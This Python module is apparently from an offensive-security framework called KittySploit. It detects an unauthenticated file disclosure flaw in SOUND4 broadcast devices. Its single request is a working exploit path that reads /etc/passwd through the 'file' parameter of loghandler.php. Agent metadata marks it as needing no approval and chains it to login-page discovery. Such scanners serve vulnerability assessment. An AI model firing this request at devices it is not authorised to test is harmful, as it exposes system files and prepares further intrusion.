#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The application suffers from an unauthenticated file disclosure vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure Detection',
        'description': "The application suffers from an unauthenticated file disclosure vulnerability. Using the 'file' GET parameter attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'lfi', 'sound4', 'unauth', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/170263/SOUND4-IMPACT-FIRST-PULSE-Eco-2.x-Unauthenticated-File-Disclosure.html',
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5736.php',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure detected",
                path='/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd',
            )
            return True
        return False

